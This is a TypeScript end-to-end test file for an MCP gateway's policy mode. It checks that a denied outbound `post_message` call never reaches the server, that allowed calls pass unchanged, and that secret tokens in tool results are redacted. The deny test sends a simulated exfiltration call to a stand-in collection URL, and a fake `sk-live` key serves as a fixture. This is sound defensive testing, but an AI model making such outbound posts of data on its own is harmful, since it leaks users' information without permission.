/**
 * e2e 2 — `record --policy`: allow, deny, and the tool-result boundary filter.
 *
 * Enforcement is only worth anything if the call it refuses NEVER REACHES THE
 * SERVER, and that is not a property the recorder can attest to about itself.
 * So the assertion here is the fixture server's byte journal: a denied
 * `post_message` is absent from it, and — the control arm — the identical
 * session run WITHOUT the policy puts it there. Every deny test in this file
 * is paired with that arm, because a deny test whose call never happened in
 * the first place passes for the wrong reason.
 *
 * The boundary half is asserted the same way round: what the CLIENT received,
 * byte for byte, compared with the line the server emitted. That is where the
 * splice invariant lives — the gateway rewrites the secret-bearing span and
 * leaves every other byte of the line exactly as the server wrote it, so
 * `98765432109876543210` keeps its last three digits and `2.0` keeps its
 * `.0`.
 */

import { describe, expect, it } from 'vitest';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  INITIALIZE,
  WIRE_SERVER,
  journalToolCalls,
  readChain,
  readJournal,
  startRecorder,
  tmpDir,
} from './helpers/harness.js';
import type { PolicyDecisionEvent, ToolCallEvent } from '../../src/schema/events.js';

const SECRET = 'sk-live-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123';

/** A result line whose untouched spans are impossible to re-serialize. */
const SECRET_RESULT =
  '{"jsonrpc":"2.0", "id":__ID__, "result":{"content":[{"type":"text","text":"token=' +
  SECRET +
  '"}],"big":98765432109876543210,"float":2.0}  }';

const ALLOWED_RAW_CALL =
  '{"jsonrpc":"2.0", "id":3, "method":"tools/call", "params":{"name":"echo","arguments":' +
  '{"big":12345678901234567890,"float":1.0,"note":"allowed-e2e"}}}';

function policyFile(dir: string, boundarySecrets: 'redact' | 'off'): string {
  const path = join(dir, `policy-${boundarySecrets}.yaml`);
  writeFileSync(
    path,
    [
      'version: 1',
      'name: e2e-gateway',
      'mcp:',
      '  default: allow',
      '  rules:',
      '    - id: no-outbound-post',
      '      match: { tool: post_message }',
      '      action: deny',
      '      reason: outbound posts are off limits',
      `  boundary: { secrets: ${boundarySecrets}, injection: flag }`,
      '',
    ].join('\n'),
  );
  return path;
}

function session(
  dataDir: string,
  journal: string,
  policy: string | undefined,
  env: Record<string, string | undefined> = {},
) {
  return startRecorder(
    [
      'record',
      '--data-dir',
      dataDir,
      '--store',
      'jsonl',
      ...(policy === undefined ? [] : ['--policy', policy]),
      '--',
      process.execPath,
      WIRE_SERVER,
    ],
    { E2E_JOURNAL: journal, E2E_RAW_RESULT: SECRET_RESULT, ...env },
  );
}

describe('e2e record --policy: enforcement reaches the wire', () => {
  it('a denied tools/call never reaches the server; the same call without the policy does', async () => {
    const dir = tmpDir('e2e-gw-deny-');
    const policy = policyFile(dir, 'redact');
    const URL_ARG = 'https://vendor-verify.example.com/collect';
    const BODY = 'e2e-exfil-body-7c1d93';

    /* --- enforced arm --------------------------------------------------- */
    const enforcedDir = join(dir, 'enforced');
    const enforcedJournal = join(dir, 'enforced.jsonl');
    const enforced = session(enforcedDir, enforcedJournal, policy);
    enforced.send(INITIALIZE);
    await enforced.response(1);
    enforced.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: { name: 'post_message', arguments: { url: URL_ARG, body: BODY } },
    });
    const denied = await enforced.response(2);
    expect(await enforced.end()).toBe(0);

    expect((denied.result as { isError?: boolean }).isError).toBe(true);
    const deniedText = JSON.stringify(denied.result);
    expect(deniedText).toContain('no-outbound-post');
    expect(deniedText).toContain('outbound posts are off limits');
    // The refusal quotes the rule, never the arguments it refused.
    expect(deniedText).not.toContain(BODY);

    // THE assertion: the upstream server never saw it.
    expect(journalToolCalls(enforcedJournal).map((c) => c.name)).not.toContain('post_message');

    // ...and the chain says why, without storing the argument in the clear.
    const chain = readChain(enforcedDir);
    const decision = chain.find((r) => r.event.kind === 'policy_decision')!.event as PolicyDecisionEvent;
    expect(decision).toMatchObject({ decision: 'deny', tool: 'post_message', rule_id: 'no-outbound-post' });
    const call = chain
      .filter((r) => r.event.kind === 'tool_call')
      .map((r) => r.event as ToolCallEvent)
      .find((e) => e.tool === 'post_message')!;
    expect(call.is_error).toBe(true);
    expect(call.gateway).toMatchObject({ decision: 'deny', rule_id: 'no-outbound-post' });
    expect(readFileSync(join(enforcedDir, 'evidence.jsonl'), 'utf8')).not.toContain(BODY);

    /* --- NEGATIVE CONTROL ARM: same session, no --policy ----------------- */
    // Without enforcement the identical call crosses to the server. This is
    // what makes the absence above evidence of the gateway rather than
    // evidence of a call that was never made. Ripping the deny path out of
    // the proxy turns this pair into two identical journals.
    const openDir = join(dir, 'open');
    const openJournal = join(dir, 'open.jsonl');
    const open = session(openDir, openJournal, undefined);
    open.send(INITIALIZE);
    await open.response(1);
    open.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: { name: 'post_message', arguments: { url: URL_ARG, body: BODY } },
    });
    const allowed = await open.response(2);
    expect(await open.end()).toBe(0);
    expect((allowed.result as { isError?: boolean }).isError).toBeUndefined();
    expect(journalToolCalls(openJournal).map((c) => c.name)).toContain('post_message');
  }, 120_000);

  it('an allowed call crosses the gateway byte for byte', async () => {
    const dir = tmpDir('e2e-gw-allow-');
    const dataDir = join(dir, 'data');
    const journal = join(dir, 'journal.jsonl');
    const policy = policyFile(dir, 'redact');

    const rec = session(dataDir, journal, policy);
    rec.send(INITIALIZE);
    await rec.response(1);
    rec.writeRaw(ALLOWED_RAW_CALL + '\n');
    await rec.response(3);
    expect(await rec.end()).toBe(0);

    const seen = readJournal(journal).map((e) => e.raw.toString('utf8'));
    // Gateway mode parses every client line to evaluate it, so "allow" has to
    // forward the ORIGINAL buffer rather than the parsed message's
    // re-serialization. This is the line that says it did.
    expect(seen).toContain(ALLOWED_RAW_CALL + '\n');

    // NEGATIVE CONTROL (in-suite): the re-serialized form differs and is
    // absent. `12345678901234567890` and `1.0` are the two spans that change.
    const reserialized = JSON.stringify(JSON.parse(ALLOWED_RAW_CALL)) + '\n';
    expect(reserialized).not.toBe(ALLOWED_RAW_CALL + '\n');
    expect(seen).not.toContain(reserialized);
  }, 60_000);

  it('the boundary filter rewrites only the secret span, and off means off', async () => {
    const dir = tmpDir('e2e-gw-boundary-');

    /* --- boundary: secrets redact --------------------------------------- */
    const redactDir = join(dir, 'redact');
    const redactJournal = join(dir, 'redact.jsonl');
    const rec = session(redactDir, redactJournal, policyFile(dir, 'redact'));
    rec.send(INITIALIZE);
    await rec.response(1);
    rec.send({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'raw' } });
    await rec.response(2);
    expect(await rec.end()).toBe(0);

    const delivered = rec.stdoutBytes().toString('utf8');
    expect(delivered).not.toContain(SECRET);
    expect(delivered).toContain('[redacted:sha256:');
    // Only the secret-bearing span was rewritten: every other byte of the
    // server's line survived, including the two a re-serializer would eat.
    // (src/proxy/stdio.ts `spliceRewrittenLine` is the mechanism; this is the
    // observable consequence of it.)
    expect(delivered).toContain('"big":98765432109876543210');
    expect(delivered).toContain('"float":2.0');

    // The chain keeps the ref so `query` can still find the leak the model
    // never saw.
    const call = readChain(redactDir)
      .filter((r) => r.event.kind === 'tool_call')
      .map((r) => r.event as ToolCallEvent)
      .find((e) => e.tool === 'raw')!;
    expect(call.gateway?.boundary).toMatchObject({ scanned: true, action: 'redact' });

    /* --- NEGATIVE CONTROL ARM: boundary secrets off ---------------------- */
    // The same server, the same result bytes, one policy field flipped: the
    // token reaches the client. Without this arm, a boundary filter that had
    // stopped working — or a server that had stopped emitting the secret —
    // would look identical to a working one.
    const offDir = join(dir, 'off');
    const offJournal = join(dir, 'off.jsonl');
    const off = session(offDir, offJournal, policyFile(dir, 'off'));
    off.send(INITIALIZE);
    await off.response(1);
    off.send({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'raw' } });
    await off.response(2);
    expect(await off.end()).toBe(0);
    expect(off.stdoutBytes().toString('utf8')).toContain(SECRET);
  }, 120_000);
});
